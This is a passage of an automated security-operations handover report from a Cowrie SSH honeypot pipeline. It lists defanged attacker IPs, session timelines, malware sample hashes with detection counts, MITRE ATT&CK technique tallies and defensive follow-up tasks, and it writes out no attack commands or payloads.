| `2026-05-23 19:12:45` | `cowrie.client.version` |
| `2026-05-23 19:12:45` | `cowrie.client.kex` |
| `2026-05-23 19:12:46` | `cowrie.login.success` |
| `2026-05-23 19:12:47` | `cowrie.session.params` |
| `2026-05-23 19:12:47` | `cowrie.command.input` |
| `2026-05-23 19:12:47` | `cowrie.command.failed` |
| `2026-05-23 19:12:48` | `cowrie.log.closed` |
| `2026-05-23 19:12:48` | `cowrie.session.params` |
| `2026-05-23 19:12:48` | `cowrie.command.input` |
| `2026-05-23 19:12:48` | `cowrie.session.file_download` |
| `2026-05-23 19:12:48` | `cowrie.log.closed` |
| `2026-05-23 19:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.87.110[.]141` to AbuseIPDB if not already reported
- [ ] Block `177.87.110[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c9ab6c4e53

| Field | Detail |
|---|---|
| **Source IP** | `177.87.110[.]141` |
| **First Seen** | 2026-05-23 19:12 |
| **Last Seen** | 2026-05-23 19:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:12:52` | `cowrie.session.connect` |
| `2026-05-23 19:12:52` | `cowrie.client.version` |
| `2026-05-23 19:12:52` | `cowrie.client.kex` |
| `2026-05-23 19:12:54` | `cowrie.login.success` |
| `2026-05-23 19:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.87.110[.]141` to AbuseIPDB if not already reported
- [ ] Block `177.87.110[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.1.16[.]230` | **325** | 2026-05-23 17:03 | 2026-05-23 19:15 | 235m | 0 | `T1592` | 🟠 MEDIUM |
| `103.118.82[.]254` | **15** | 2026-05-23 18:02 | 2026-05-23 18:58 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.44.15[.]210` | **15** | 2026-05-23 17:31 | 2026-05-23 18:30 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.71.30[.]159` | **15** | 2026-05-23 17:51 | 2026-05-23 18:50 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.111[.]119` | **10** | 2026-05-23 17:06 | 2026-05-23 17:40 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **9** | 2026-05-23 17:06 | 2026-05-23 19:13 | 8m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]131` | **3** | 2026-05-23 17:39 | 2026-05-23 17:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]33` | **3** | 2026-05-23 17:40 | 2026-05-23 17:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `177.87.110[.]141` | **2** | 2026-05-23 17:56 | 2026-05-23 19:12 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.61[.]119` | **2** | 2026-05-23 19:03 | 2026-05-23 19:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]23` | 1 | 2026-05-23 17:33 | 2026-05-23 17:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.35.217[.]121` | 1 | 2026-05-23 17:05 | 2026-05-23 17:06 | 90s | 0 | `T1592` | 🟢 LOW |
| `180.93.3[.]33` | 1 | 2026-05-23 18:02 | 2026-05-23 18:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.239.56[.]187` | 1 | 2026-05-23 17:47 | 2026-05-23 17:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `206.62.161[.]3` | 1 | 2026-05-23 18:12 | 2026-05-23 18:14 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `161.35.217[.]121` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `14.1.16[.]230` | AU | Real World Technology Solutions Pty Ltd | **100** ⚠️ | 0 |
| `180.93.3[.]33` | VN | Saigon Postel Corporation | **100** ⚠️ | 7 |
| `66.132.172[.]33` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.172[.]131` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `103.118.82[.]254` | ID | Yayasan Pendidikan Universitas Presiden | **100** ⚠️ | 13 |
| `101.36.111[.]119` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `34.71.30[.]159` | US | Google LLC | **100** ⚠️ | 42 |
| `197.44.15[.]210` | EG | TE Data | **100** ⚠️ | 50 |
| `101.126.54[.]23` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 125 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 60 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 32 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 32 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 477 cases |
| Tool 34  | Credential Extractor        | ✅ 124 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (1.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 15 recon entry/entries in table (10 group(s) consolidating 399 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T19:16:49Z_
